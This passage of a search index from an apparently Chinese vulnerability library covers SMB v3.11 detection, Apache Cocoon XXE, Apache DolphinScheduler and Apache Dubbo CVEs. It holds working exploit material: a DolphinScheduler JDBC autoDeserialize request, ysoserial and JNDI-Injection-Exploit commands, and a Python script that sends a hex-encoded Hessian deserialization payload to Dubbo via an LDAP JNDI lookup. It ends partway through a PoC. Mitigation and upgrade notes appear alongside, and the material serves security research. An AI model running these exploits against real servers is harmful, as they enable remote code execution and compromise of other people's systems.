' | tr 'Nmap scan report for' '@' | tr \"@\" \"\\n\" | tr '|' ' ' | tr '_' ' ' | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+'\n\nif [[ $? != 0 ]]; then\n    echo \"There's no SMB v3.11\"\nfi\n</code></pre> <p>\u6f0f\u6d1e\u7f13\u89e3\u65b9\u6cd5</p> <ul> <li>\u6ce8:\u5728powershell\u4e0b\u7981\u6b62\u6216\u8005\u5f00\u542f\u5373\u53ef\u7f13\u89e3</li> </ul> <p>Disable compression:</p> <p>Set-ItemProperty -Path \u201cHKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u201d DisableCompression -Type DWORD -Value 1 -Force</p> <p>Enable compression:</p> <p>Set-ItemProperty -Path \u201cHKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\u201d DisableCompression -Type DWORD -Value 0 -Force</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/","title":"Apache Cocoon XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff08CVE-2020-11991\uff09","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Apache Cocoon &lt;= 2.1.12</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Cocoon%20XML%20%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11991%EF%BC%89/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u6784\u9020\u5185\u5bb9\u5982\u4e0b\uff0c\u5411/v2/api/product/manger/getInfo\u4f4d\u7f6e POST\u5982\u4e0b\u5185\u5bb9\u5373\u53ef </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/","title":"Apache DolphinScheduler\u9ad8\u5371\u6f0f\u6d1e\uff08CVE-2020-11974\u3001CVE-2020-13922\uff09","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>Apache\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u4fee\u590d\u4e86Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09\u4e0eApache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09\u3002 CVE-2020-11974\u4e0emysql connectorj\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\u6709\u5173\uff0c\u5728\u9009\u62e9mysql\u4f5c\u4e3a\u6570\u636e\u5e93\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u901a\u8fc7jdbc connect\u53c2\u6570\u8f93\u5165{\u201cdetectCustomCollations\u201d:true\uff0c\u201c autoDeserialize\u201d:true} \u5728DolphinScheduler \u670d\u52a1\u5668\u4e0a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002 CVE-2020-13922\u5bfc\u81f4\u666e\u901a\u7528\u6237\u53ef\u901a\u8fc7api interface\u5728DolphinScheduler \u7cfb\u7edf\u4e2d\u8986\u76d6\u5176\u4ed6\u7528\u6237\u7684\u5bc6\u7801\uff1aapi interface /dolphinscheduler/users/update\uff0c\u8bf7\u76f8\u5173\u7528\u6237\u53ca\u65f6\u5347\u7ea7\u8fdb\u884c\u9632\u62a4\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_2","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>Apache DolphinScheduler\u6743\u9650\u8986\u76d6\u6f0f\u6d1e\uff08CVE-2020-13922\uff09</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_3","title":"\u53d7\u5f71\u54cd\u7248\u672c","text":"<p>Apache DolphinScheduler = 1.2.0\u30011.2.1\u30011.3.1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89/#_4","title":"\u4e0d\u53d7\u5f71\u54cd\u7248\u672c","text":"<p>Apache DolphinScheduler &gt;= 1.3.2 Apache DolphinScheduler\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff08CVE-2020-11974\uff09 \u5b83\u662f\u2f00\u4e2a\u5206\u5e03\u5f0f\u53bb\u4e2d\u2f3c\u5316\uff0c\u6613\u6269\u5c55\u7684\u53ef\u89c6\u5316DAG(\u6709\u5411\u2f46\u73af\u56fe)\u2f2f\u4f5c\u6d41\u4efb\u52a1\u8c03\u5ea6\u7cfb\u7edf\u3002\u5229\u2f64\u6f0f\u6d1e:\u9700\u8981\u767b\u5f55\u6743\u9650, [09/12 \u6001\u52bf\u611f\u77e5]\u63d0\u4f9b\u2f00\u7ec4\u9ed8\u8ba4\u5bc6\u7801\u3002 \u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u6570\u636e\u6e90\u4e2d\u2f3c\u672a\u9650\u5236\u6dfb\u52a0\u7684jdbc\u8fde\u63a5\u53c2\u6570,\u4ece\u2f7d\u5b9e\u73b0JDBC\u5ba2\u6237\u7aef\u53cd\u5e8f\u5217\u5316\u3002</p> <p>1\u3001\u767b\u5f55\u5230\u2faf\u677f -&gt; \u6570\u636e\u6e90\u4e2d\u2f3c\u3002</p> <p></p> <p>2\u3001jdbc\u8fde\u63a5\u53c2\u6570\u5c31\u662f\u4e3b\u2ec6,\u8fd9\u2fa5\u6ca1\u6709\u9650\u5236\u4efb\u610f\u7c7b\u578b\u7684\u8fde\u63a5\u4e32\u53c2\u6570\u3002 </p> <p>3\u3001\u5c06\u4ee5\u4e0b\u6570\u636e\u6dfb\u52a0\u5230jdbc\u8fde\u63a5\u53c2\u6570\u4e2d,\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e6\u53d1\u3002 </p> <pre><code>POST /dolphinscheduler/datasources/connect HTTP/1.1\ntype=MYSQL&amp;name=test\u00ace=&amp;host=127.0.0.1&amp;port=3306&amp;database=test&amp;\nprincipal=&amp;userName=root&amp;password=root&amp;connectType=&amp;\nother={\"detectCustomCollations\":true,\"autoDeserialize\":true} \n</code></pre> <pre><code>#### \u53d7\u5f71\u54cd\u7248\u672c\n\nApache DolphinScheduler = 1.2.0\u30011.2.1\n\n#### \u4e0d\u53d7\u5f71\u54cd\u7248\u672c\n\nApache DolphinScheduler &gt;= 1.3.1\n\n#### \u4fee\u590d\u5efa\u8bae\n\n\u5b98\u65b9\u5347\u7ea7 \u76ee\u524d\u5b98\u65b9\u5df2\u5728\u6700\u65b0\u7248\u672c\u4e2d\u4fee\u590d\u4e86\u6b64\u6b21\u7684\u6f0f\u6d1e\uff0c\u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u7248\u672c\u81f31.3.2\u8fdb\u884c\u9632\u62a4\u3002\n\u5b98\u65b9\u4e0b\u8f7d\u94fe\u63a5\uff1a https://dolphinscheduler.apache.org/zhcn/docs/release/download.html\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2019-17564%29/","title":"Apache Dubbo\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE 2019 17564)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2019-17564%29/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>CVE-2019-17564\u662fApache Dubbo HTTP\u534f\u8bae\u4e2d\u7684\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e,\u8be5\u6f0f\u6d1e\u7684\u4e3b\u8981\u539f\u56e0\u5728\u4e8e\u5f53Apache Dubbo\u542f\u7528HTTP\u534f\u8bae\u4e4b\u540e\uff0cApache Dubbo\u5728\u63a5\u53d7\u6765\u81ea\u6d88\u8d39\u8005\u7684\u8fdc\u7a0b\u8c03\u7528\u8bf7\u6c42\u7684\u65f6\u5019\u5b58\u5728\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u884c\u4e3a\uff0c\u5f53\u9879\u76ee\u5305\u4e2d\u5b58\u5728\u53ef\u7528\u7684gadgets\u65f6\u5373\u53ef\u5bfc\u81f4\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2019-17564%29/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>2.7.0 &lt;= Apache Dubbo &lt;= 2.7.4</p> <p>2.6.0 &lt;= Apache Dubbo &lt;= 2.6.7</p> <p>Apache Dubbo = 2.5.x</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2019-17564%29/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u4f7f\u7528ysoserial\u751f\u6210payload</p> <pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections4 calc &gt; 1.ser\n</code></pre> <p>burp\u5bfc\u5165\u751f\u6210\u7684payload \u53d1\u9001</p> <pre><code>POST /org.apache.dubbo.samples.http.api.DemoService HTTP/1.1 \nHost: 192.168.0.102:8080\n\n&lt;ysoserial\u751f\u6210\u7684payload&gt;\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Apache/Apache%20Dubbo%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CCVE-2020-1948/","title":"Apache Dubbo\u6076\u610f\u4ee3\u7801\u6267\u884cCVE 2020 1948","text":"<p>\u5173\u6ce8\u8be5\u6f0f\u6d1e\u7684\u7ae5\u978b\uff0c\u5e94\u8be5\u5bf9 <code>Dubbo</code> \u8fd9\u4e2a\u67b6\u6784\u4f18\u79c0\u7684 <code>RPC</code> \u6846\u67b6\u4e0d\u964c\u751f\uff0c\u6240\u4ee5\u76f4\u5165\u4e3b\u9898</p> <p>\u817e\u8baf\u5b89\u5168\u7384\u6b66\u5b9e\u9a8c\u5ba4\u7814\u7a76\u5458\u53d1\u73b0\uff0c<code>Dubbo 2.7.6</code> \u6216\u66f4\u4f4e\u7248\u672c\u91c7\u7528\u7684\u9ed8\u8ba4\u53cd\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u5728\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u5f53 <code>Dubbo</code> \u670d\u52a1\u7aef\u66b4\u9732\u65f6(\u9ed8\u8ba4\u7aef\u53e3\uff1a20880)\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u672a\u7ecf\u9a8c\u8bc1\u7684\u670d\u52a1\u540d\u6216\u65b9\u6cd5\u540d\u7684RPC\u8bf7\u6c42\uff0c\u540c\u65f6\u914d\u5408\u9644\u52a0\u6076\u610f\u7684\u53c2\u6570\u8d1f\u8f7d\u3002\u5f53\u6076\u610f\u53c2\u6570\u88ab\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u5b83\u5c06\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002</p> <p>\u7ecf\u9a8c\u8bc1\u8be5\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u9700\u8981\u670d\u52a1\u7aef\u5b58\u5728\u53ef\u4ee5\u88ab\u5229\u7528\u7684\u7b2c\u4e09\u65b9\u5e93\uff0c\u800c\u7814\u7a76\u53d1\u73b0\u6781\u5927\u591a\u6570\u5f00\u53d1\u8005\u90fd\u4f1a\u4f7f\u7528\u7684\u67d0\u4e9b\u7b2c\u4e09\u65b9\u5e93\u5b58\u5728\u80fd\u591f\u5229\u7528\u7684\u653b\u51fb\u94fe\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u5b83\u4eec\u76f4\u63a5\u5bf9 <code>Dubbo</code> \u670d\u52a1\u7aef\u8fdb\u884c\u6076\u610f\u4ee3\u7801\u6267\u884c\uff0c\u5f71\u54cd\u5e7f\u6cdb\u3002</p> <p>\u5f71\u54cd\u7248\u672c</p> <p>dubbo 2.7.6 \u4ee5\u4e0b\u7684\u7248\u672c</p> <p>\u590d\u73b0\u73af\u5883</p> <ul> <li>mac 10.15</li> <li>idea 2020.1</li> <li>jdk-8u151\uff08\u4e0b\u8f7d\u5730\u5740\uff09</li> </ul> <p>\u6f0f\u6d1e\u6ce8\u5165\u7b80\u4ecb</p> <p>\u6f0f\u6d1e\u53d1\u73b0\u8005 <code>rui0</code>\uff0c\u4f7f\u7528 <code>Remo</code> \u6a21\u5757\uff0c\u6700\u7ec8\u662f\u901a\u8fc7 <code>JdbcRowSetImpl</code> \u8c03\u7528 <code>jndi</code> \u6765\u8fdb\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p>\u7531\u4e8e\u8be5\u573a\u666f\u590d\u73b0\u4f9d\u8d56\u4e8e\u4f4e\u7248\u672c\u7684 jdk\uff0c\u4e4b\u524d\u4f7f\u7528 jdk-8u221 \u6ca1\u80fd\u590d\u73b0\uff0c\u53bb\u5b98\u7f51\u4e0b\u8f7d\u56de\u4f4e\u7248\u672c\uff0c\u4f7f\u7528\u4f4e\u7248\u672c\u540e\u6210\u529f\u590d\u73b0</p> <ul> <li>PoC\uff1a <code>Proof Of Concept</code> \u7684\u7f29\u5199\u3002\u5728\u9ed1\u5ba2\u5708\u6307\uff1a\u89c2\u70b9\u9a8c\u8bc1\u7a0b\u5e8f\u3002</li> <li>CVE\uff1a <code>Common Vulnerabilities &amp; Exposures</code> \u901a\u7528\u6f0f\u6d1e\u62ab\u9732\u3002</li> <li>Exp\uff1a<code>Exploit</code>\uff0c\u5728\u5b89\u5168\u65b9\u9762\uff0c\u7ffb\u8bd1\u4e3a \u300c\u5229\u7528\u300d\uff0c\u6307\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb\u7684\u52a8\u4f5c\u3002</li> <li>Payload\uff1a\u7ffb\u8bd1\u4e3a\u300c\u6709\u6548\u8d1f\u8377\u300d\uff0c\u6307\u6210\u529f <code>exploit</code> \u540e\uff0c\u5728\u76ee\u6807\u7cfb\u7edf\u6267\u884c\u7684\u4ee3\u7801\u6216\u6307\u4ee4\u3002</li> <li>RCE\uff1a<code>remote code execution</code> \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u7b80\u79f0 <code>RCE</code> \u6f0f\u6d1e\u3002</li> <li>RMI\uff1a \u4e13\u4e3a <code>Java</code> \u73af\u5883\u8bbe\u8ba1\u7684\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u673a\u5236\uff0c\u8fdc\u7a0b\u670d\u52a1\u5668\u5b9e\u73b0\u5177\u4f53\u7684 <code>Java</code> \u65b9\u6cd5\u5e76\u63d0\u4f9b\u63a5\u53e3\uff0c\u5ba2\u6237\u7aef\u672c\u5730\u4ec5\u9700\u6839\u636e\u63a5\u53e3\u7c7b\u7684\u5b9a\u4e49\uff0c\u63d0\u4f9b\u76f8\u5e94\u7684\u53c2\u6570\u5373\u53ef\u8c03\u7528\u8fdc\u7a0b\u65b9\u6cd5\u5e76\u83b7\u53d6\u6267\u884c\u7ed3\u679c\uff0c\u4f7f\u5206\u5e03\u5728\u4e0d\u540c\u7684 <code>JVM</code> \u4e2d\u7684\u5bf9\u8c61\u7684\u5916\u8868\u548c\u884c\u4e3a\u90fd\u50cf\u672c\u5730\u5bf9\u8c61\u4e00\u6837\u3002</li> <li>LDAP\uff1a \u8f7b\u91cf\u7ea7\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff0c\u76ee\u5f55\u670d\u52a1\u662f\u4e00\u79cd\u4ee5\u6811\u72b6\u7ed3\u6784\u7684\u76ee\u5f55\u6570\u636e\u5e93\u4e3a\u57fa\u7840\uff0c\u5916\u52a0\u5404\u79cd\u8bbf\u95ee\u534f\u8bae\u7684\u4fe1\u606f\u67e5\u8be2\u670d\u52a1</li> <li>JNDI\uff1a <code>Java Naming and Directory Interface</code>\uff0c\u5305\u62ec <code>Naming Server</code> \u548c <code>Directory Server</code>\u3002\u662f\u4e00\u79cd <code>Java API</code>\uff0c\u5141\u8bb8\u5ba2\u6237\u7aef\u901a\u8fc7\u540d\u79f0\u53d1\u73b0\u548c\u67e5\u627e\u6570\u636e\u3001\u5bf9\u8c61\u3002\u8fd9\u4e9b\u5bf9\u8c61\u53ef\u4ee5\u5b58\u50a8\u5728\u4e0d\u540c\u7684\u547d\u540d\u6216\u76ee\u5f55\u670d\u52a1\u4e2d\uff0c\u4f8b\u5982\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\uff08RMI\uff09\uff0c\u516c\u5171\u5bf9\u8c61\u8bf7\u6c42\u4ee3\u7406\u4f53\u7cfb\u7ed3\u6784\uff08CORBA\uff09\uff0c\u8f7b\u578b\u76ee\u5f55\u8bbf\u95ee\u534f\u8bae\uff08LDAP\uff09\u6216\u57df\u540d\u670d\u52a1\uff08DNS\uff09\u3002</li> </ul> <p>\u4ee5\u4e0a\u5927\u6982\u5c31\u662f\u672c\u6b21\u6f0f\u6d1e\u6240\u6d89\u53ca\u5230\u7684\u4e13\u4e1a\u540d\u8bcd\uff0c\u5148\u6709\u4e2a\u5927\u6982\u4e86\u89e3\uff0c\u540e\u9762\u7684\u5185\u5bb9\u770b\u7684\u5e94\u8be5\u6bd4\u8f83\u660e\u767d\u3002</p> <p>\u590d\u73b0\u573a\u666f\u7ffb\u9605\u4e86\u5f88\u591a\u7bc7\u6587\u7ae0\u548c\u5c1d\u8bd5\uff0c\u53d1\u73b0\u901a\u8fc7\u522b\u4eba\u6784\u9020\u7684 <code>payload</code> \u6765\u590d\u73b0\u6700\u4e3a\u7b80\u5355\uff0c\u6240\u4ee5\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\u590d\u73b0\u7684\u6d41\u7a0b</p> <p>\u653b\u51fb\u4f9d\u8d56\u4e8e <code>rome</code> \u5de5\u5177\u5305\u4e2d\u7684 <code>ToStringBean</code> \u5de5\u5177\uff0c\u6240\u4ee5\u65e0\u8bba\u4e0b\u8f7d\u4ec0\u4e48\u63d0\u4f9b\u8005\u9879\u76ee\uff0c\u90fd\u9700\u8981\u5c06\u4ee5\u4e0b\u4f9d\u8d56\u52a0\u5165\u5230 <code>POM.xml</code> \u6587\u4ef6\u4e2d</p> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;com.rometools&lt;/groupId&gt;\n    &lt;artifactId&gt;rome&lt;/artifactId&gt;\n    &lt;version&gt;1.7.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <p>\u4ee5 <code>dubbo-spring-boot-project</code> \u8bf4\u660e</p> <ul> <li>\u4e00\u3001\u5728 <code>github</code> \u4e0b\u8f7d\u793a\u4f8b\u4ee3\u7801\uff0c\u5207\u6362\u5206\u652f\u5230 2.7.6 \u6216\u66f4\u65e9\u4e4b\u524d</li> <li>\u4e8c\u3001\u5728 <code>pom.xml</code> \u4e2d\u52a0\u5165\u4e0a\u9762\u63d0\u5230\u7684 <code>remo</code> \u4f9d\u8d56</li> <li>\u4e09\u3001\u6253\u5305\u542f\u52a8</li> </ul> <pre><code>// \u4e0b\u8f7d\n$ git clone https://github.com/apache/dubbo-spring-boot-project.git\n// \u5207\u6362\u5206\u652f\n$ git checkout 2.7.6\n// \u6dfb\u52a0\u5b8c\u4f9d\u8d56\u540e\uff0c\u6253\u5305\n$ mvn clean install -DskipTests\n</code></pre> <p></p> <ul> <li>\u56db\u3001\u542f\u52a8\u670d\u52a1\u63d0\u4f9b\u8005</li> </ul> <p>\u542f\u52a8\u7684\u65f6\u5019\uff0c\u6ce8\u610f\u8981\u7528\u4f4e\u7248\u672c\u7684 <code>JDK</code>\uff0c\u4f7f\u7528 <code>IDEA</code> \u7684\u8bdd\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u9009\u62e9\u7f16\u8bd1\u8fd0\u884c\u7684 <code>JRE</code></p> <p></p> <p>\u63a5\u7740\u542f\u52a8 <code>Provier</code> \u5373\u53ef</p> <p>\u4f7f\u7528\u4e86\u8be5\u4f4d\u5927\u4f6c\u7684 <code>PoC</code>\uff0c\u91cc\u9762\u6ce8\u5165\u7684 <code>URL</code> \u662f <code>ldap://127.0.0.1:1389/Exploit</code>\uff0c\u5177\u4f53\u539f\u7406\u53ef\u4ee5 \u53c2\u8003\u8d44\u6599\u516d</p> <p>\u5177\u4f53\u539f\u7406\u8bf4\u660e\uff1a</p> <p></p> <p>\u4ee5\u4e0b\u5185\u5bb9\u5f15\u7528\u81ea Apache Dubbo Provider\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2020-1948) \u5229\u7528\u590d\u73b0\u53caPOC</p> <ul> <li>\u4e00\u3001\u4e0b\u8f7d\u6ce8\u5165\u5de5\u5177\u4ee3\u7801</li> </ul> <pre><code>$ git clone https://github.com/sayers522/JNDI-Injection-Exploit\n</code></pre> <ul> <li>\u4e8c\u3001\u7f16\u8bd1\u5de5\u5177\u5305\uff0c\u5728 <code>target</code> \u76ee\u5f55\u751f\u6210</li> </ul> <pre><code>$ mvn clean install -DskipTests\n</code></pre> <ul> <li>\u4e09\u3001\u8fd0\u884c <code>JNDI</code> \u5de5\u5177\u5305</li> </ul> <pre><code>$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]\n</code></pre> <p>\u4f8b\u5982\u6d4b\u8bd5\u65f6\uff0c\u6267\u884c\u7684\u547d\u4ee4\u662f\u6253\u5f00\u8ba1\u7b97\u5668\uff0c\u53ef\u4ee5\u6267\u884c\u4e0b\u9762\u547d\u4ee4</p> <pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"open /System/Applications/Calculator.app\" -A 127.0.0.1\n</code></pre> <p>\u7f16\u8f91\u4ee5\u4e0b Python \u811a\u672c\uff0c\u89e6\u53d1 dubbo provider \u53cd\u5e8f\u5217\u5316\uff0c\u4f8b\u5982\u4ee5\u6f0f\u6d1e\u540d\u6765\u547d\u540d\u4e3a <code>2020_1948.py</code></p> <pre><code>#-*-coding:utf-8-*-\nimport socket\n\ndef sendEvilObjData(sock):\n    payload=\"DABBC20000000000000000000000037805322E302E3230366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636505312E302E300474657374124C6A6176612F6C616E672F4F626A6563743B48433027636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E457175616C734265616E92036F626A096265616E436C61737360433029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E92036F626A096265616E436C61737361431D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706CAC06706172616D73096C697374656E657273036D61700A6368617253747265616D0B617363696953747265616D0D756E69636F646553747265616D0C62696E61727953747265616D0F7374724D61746368436F6C756D6E730D694D61746368436F6C756D6E73057265734D4406726F77734D4402727302707304636F6E6E09666574636853697A650866657463684469720969736F6C6174696F6E1065736361706550726F63657373696E6708726561644F6E6C790B636F6E63757272656E63790C6D61784669656C6453697A65076D6178526F77730C717565727954696D656F75740B73686F7744656C657465640A726F77536574547970650A64617461536F757263650355524C07636F6D6D616E64624D136A6176612E7574696C2E486173687461626C655A4E4E4E4E4E4E56106A6176612E7574696C2E566563746F729A03666F6F4E4E4E4E4E4E4E4E4E56919A8F8F8F8F8F8F8F8F8F8F4E4E4E4E4E90CBE8925454CBF090909046CBEC1D6C6461703A2F2F3132372E302E302E313A313338392F4578706C6F69744E4E430F6A6176612E6C616E672E436C61737391046E616D65631D636F6D2E73756E2E726F777365742E4A646263526F77536574496D706C633029636F6D2E726F6D65746F6F6C732E726F6D652E666565642E696D706C2E546F537472696E674265616E5191519151915A48047061746830366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F5365727669636509696E7465726661636530366F72672E6170616368652E647562626F2E737072696E672E626F6F742E64656D6F2E636F6E73756D65722E44656D6F536572766963650776657273696F6E05312E302E305A\"\n    sock.send(payload.decode('hex'))\n\ndef run(dip,dport):\n    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    server_addr=(dip,dport)\n    sock.connect(server_addr)\n    sendEvilObjData(sock)\n\nrun(\"127.0.0.1\",12345)\n</code></pre> <p>\u6700\u7ec8\u590d\u73b0\u6548\u679c\uff1a</p> <p></p> <ul> <li>1\u3001\u4e0b\u8f7d <code>demo</code> \u4ee3\u7801\uff0c\u52a0\u5165 <code>rome</code> \u4f9d\u8d56</li> <li>2\u3001\u542f\u52a8 <code>JNDI</code> \u670d\u52a1</li> <li>3\u3001\u6784\u9020 <code>2020-1948.py</code> Poc \u653b\u51fb</li> </ul> <p>\u7f51\u4e0a\u516c\u5e03\u7684 <code>PoC</code> \u4ee3\u7801</p> <pre><code>from dubbo.codec.hessian2 import Decoder,new_object\nfrom dubbo.client import DubboClient\n\nclient = DubboClient('127.0.0.1', 12345)\n\nJdbcRowSetImpl=new_object(\n      'com.sun.rowset.JdbcRowSetImpl',\n      dataSource=\"ldap://127.0.0.1:8087/#ExportObject\",\n      strMatchColumns=[\"foo\"]\n      )\nJdbcRowSetImplClass=new_object(\n      'java.lang.Class',\n      name=\"com.sun.rowset.JdbcRowSetImpl\",\n      )\ntoStringBean=new_object(\n      'com.rometools.rome.feed.impl.ToStringBean',\n      beanClass=JdbcRowSetImplClass,\n      obj=JdbcRowSetImpl\n      )\n\nresp = 